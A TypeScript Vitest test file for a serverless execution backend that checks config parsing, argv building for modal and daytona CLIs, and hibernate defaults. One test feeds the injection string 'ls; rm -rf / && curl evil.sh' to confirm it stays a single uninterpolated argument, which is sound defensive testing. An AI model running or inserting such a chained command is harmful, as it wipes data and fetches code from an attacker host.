import { describe, it, expect } from "vitest";
import {
  resolveServerlessConfig,
  buildServerlessArgs,
  serverlessBackendEnabled,
  hibernatePolicy,
  ServerlessConfigSchema,
  SERVERLESS_CLI,
  type ServerlessConfig,
} from "./serverless.js";

const env = (o: Record<string, string>) => o as unknown as NodeJS.ProcessEnv;

describe("resolveServerlessConfig", () => {
  it("returns ok with the provider when VANTA_SERVERLESS_PROVIDER is set", () => {
    const r = resolveServerlessConfig(env({ VANTA_SERVERLESS_PROVIDER: "modal" }));
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.config.provider).toBe("modal");
  });

  it("returns {ok:false, reason} when no provider is set", () => {
    const r = resolveServerlessConfig(env({}));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toMatch(/VANTA_SERVERLESS_PROVIDER/);
  });

  it("returns {ok:false, reason} for an unknown provider", () => {
    const r = resolveServerlessConfig(env({ VANTA_SERVERLESS_PROVIDER: "lambda" }));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toMatch(/invalid/);
  });

  it("parses app, image, and idle timeout from their env vars", () => {
    const r = resolveServerlessConfig(
      env({
        VANTA_SERVERLESS_PROVIDER: "daytona",
        VANTA_SERVERLESS_APP: "devbox",
        VANTA_SERVERLESS_IMAGE: "python:3.12",
        VANTA_SERVERLESS_IDLE_SEC: "600",
      }),
    );
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.config).toMatchObject({ provider: "daytona", app: "devbox", image: "python:3.12", idleTimeoutSec: 600 });
    }
  });

  it("rejects a non-positive or non-numeric idle timeout", () => {
    expect(resolveServerlessConfig(env({ VANTA_SERVERLESS_PROVIDER: "modal", VANTA_SERVERLESS_IDLE_SEC: "0" })).ok).toBe(false);
    expect(resolveServerlessConfig(env({ VANTA_SERVERLESS_PROVIDER: "modal", VANTA_SERVERLESS_IDLE_SEC: "abc" })).ok).toBe(false);
  });

  it("maps VANTA_SERVERLESS_NET=1 to network:true", () => {
    const r = resolveServerlessConfig(env({ VANTA_SERVERLESS_PROVIDER: "modal", VANTA_SERVERLESS_NET: "1" }));
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.config.network).toBe(true);
  });
});

describe("buildServerlessArgs", () => {
  it("builds the modal run shape with --timeout and the -- separator", () => {
    const config: ServerlessConfig = { provider: "modal", app: "myapp", idleTimeoutSec: 300 };
    expect(buildServerlessArgs(["sh", "-c", "ls"], config)).toEqual([
      "run", "myapp", "--timeout", "300", "--", "sh", "-c", "ls",
    ]);
  });

  it("builds the daytona exec shape distinct from modal", () => {
    const config: ServerlessConfig = { provider: "daytona", app: "devbox", idleTimeoutSec: 600 };
    expect(buildServerlessArgs(["echo", "hi"], config)).toEqual([
      "exec", "devbox", "--idle", "600", "--", "echo", "hi",
    ]);
  });

  it("preserves an injection-shaped baseCmd token as ONE discrete argv item (no shell interpolation)", () => {
    const nasty = "ls; rm -rf / && curl evil.sh";
    const args = buildServerlessArgs(["sh", "-c", nasty], { provider: "modal" });
    // the whole malicious string survives as exactly one element — never split or interpolated
    expect(args).toContain(nasty);
    expect(args.filter((a) => a === nasty)).toHaveLength(1);
    expect(args).toEqual(expect.arrayContaining(["run", "--", "sh", "-c", nasty]));
  });

  it("defaults the timeout to 300 when idle is unset", () => {
    expect(buildServerlessArgs(["x"], { provider: "modal" })).toContain("300");
    expect(buildServerlessArgs(["x"], { provider: "daytona" })).toContain("300");
  });

  it("threads the image through both providers", () => {
    expect(buildServerlessArgs(["x"], { provider: "modal", image: "py" })).toEqual(expect.arrayContaining(["--image", "py"]));
    expect(buildServerlessArgs(["x"], { provider: "daytona", image: "py" })).toEqual(expect.arrayContaining(["--image", "py"]));
  });

  it("passes --no-network to daytona only when network is explicitly false", () => {
    expect(buildServerlessArgs(["x"], { provider: "daytona", network: false })).toContain("--no-network");
    expect(buildServerlessArgs(["x"], { provider: "daytona", network: true })).not.toContain("--no-network");
    expect(buildServerlessArgs(["x"], { provider: "daytona" })).not.toContain("--no-network");
  });
});

describe("serverlessBackendEnabled", () => {
  it("is true when backend=serverless AND a provider is configured", () => {
    expect(serverlessBackendEnabled(env({ VANTA_EXEC_BACKEND: "serverless", VANTA_SERVERLESS_PROVIDER: "modal" }))).toBe(true);
  });

  it("is false when backend=serverless but no provider", () => {
    expect(serverlessBackendEnabled(env({ VANTA_EXEC_BACKEND: "serverless" }))).toBe(false);
  });

  it("is false when a provider is set but the backend is not serverless", () => {
    expect(serverlessBackendEnabled(env({ VANTA_EXEC_BACKEND: "docker", VANTA_SERVERLESS_PROVIDER: "modal" }))).toBe(false);
    expect(serverlessBackendEnabled(env({ VANTA_SERVERLESS_PROVIDER: "modal" }))).toBe(false);
  });
});

describe("hibernatePolicy", () => {
  it("reports the idle timeout and hibernates:true for a positive timeout", () => {
    expect(hibernatePolicy({ provider: "modal", idleTimeoutSec: 120 })).toEqual({ idleTimeoutSec: 120, hibernates: true });
  });

  it("defaults to 300s and hibernates when idle is unset", () => {
    expect(hibernatePolicy({ provider: "daytona" })).toEqual({ idleTimeoutSec: 300, hibernates: true });
  });
});

describe("module surface", () => {
  it("names a CLI binary per provider (the live boundary)", () => {
    expect(SERVERLESS_CLI).toEqual({ modal: "modal", daytona: "daytona" });
  });

  it("ServerlessConfigSchema rejects an empty app string", () => {
    expect(ServerlessConfigSchema.safeParse({ provider: "modal", app: "" }).success).toBe(false);
  });
});
